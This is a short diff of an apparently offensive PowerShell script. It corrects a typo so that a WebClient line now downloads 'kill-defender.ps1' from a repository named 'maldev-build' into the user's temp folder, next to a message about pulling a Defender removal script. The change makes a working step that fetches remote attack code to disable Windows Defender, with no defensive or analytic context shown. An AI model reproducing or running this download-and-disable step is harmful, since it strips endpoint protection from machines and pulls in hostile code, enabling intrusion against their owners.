@@ -60,4 +60,4 @@ catch {
 }
 
 Write-Host "Pulling and Defender removal script"
-(New-Ibject System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hack3n/maldev-build/main/kill-defender.ps1', "$env:temp/kill-defender.ps1")
+(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hack3n/maldev-build/main/kill-defender.ps1', "$env:temp/kill-defender.ps1")
